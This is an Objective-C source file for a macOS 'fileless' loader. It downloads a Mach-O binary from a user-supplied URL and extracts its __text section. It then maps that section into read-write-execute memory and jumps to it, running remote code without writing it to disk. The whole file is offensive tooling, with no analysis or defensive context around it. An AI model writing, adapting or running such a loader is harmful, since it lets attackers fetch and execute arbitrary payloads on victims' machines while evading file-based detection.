// fileless_loader_text.m
#import <Foundation/Foundation.h>
#import <mach-o/loader.h>
#import <sys/mman.h>
#import <string.h>
#import <stdio.h>

typedef void (*entry_t)(void);

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <url_to_raw_macho>\n", argv[0]);
        return 1;
    }

    NSString *urlString = [NSString stringWithUTF8String:argv[1]];
    NSURL *url = [NSURL URLWithString:urlString];
    NSError *err = nil;

    NSData *machoData = [NSData dataWithContentsOfURL:url options:0 error:&err];
    if (!machoData) {
        fprintf(stderr, "Failed to download Mach-O: %s\n", [[err localizedDescription] UTF8String]);
        return 1;
    }

    uint8_t *raw = (uint8_t *)[machoData bytes];
    size_t size = [machoData length];

    struct mach_header_64 *hdr = (struct mach_header_64 *)raw;
    if (hdr->magic != MH_MAGIC_64) {
        fprintf(stderr, "Not a valid 64-bit Mach-O\n");
        return 1;
    }

    // Locate __text section in __TEXT segment
    struct load_command *lc = (struct load_command *)(hdr + 1);
    uint8_t *textStart = NULL;
    uint64_t textSize = 0;

    for (uint32_t i = 0; i < hdr->ncmds; i++) {
        if (lc->cmd == LC_SEGMENT_64) {
            struct segment_command_64 *seg = (struct segment_command_64 *)lc;
            if (strcmp(seg->segname, "__TEXT") == 0) {
                struct section_64 *sect = (struct section_64 *)(seg + 1);
                for (uint32_t j = 0; j < seg->nsects; j++) {
                    if (strcmp(sect->sectname, "__text") == 0) {
                        textStart = raw + sect->offset;
                        textSize  = sect->size;
                        break;
                    }
                    sect++;
                }
                if (textStart) break;
            }
        }
        lc = (struct load_command *)((char *)lc + lc->cmdsize);
    }

    if (!textStart || textSize == 0) {
        fprintf(stderr, "__text section not found\n");
        return 1;
    }

    // Allocate executable memory for __text
    void *mem = mmap(NULL, textSize, PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_ANON | MAP_PRIVATE, -1, 0);
    if (mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    // Copy __text into executable memory
    memcpy(mem, textStart, textSize);

    // Jump to __text
    entry_t func = (entry_t)mem;
    func();

    return 0;
}
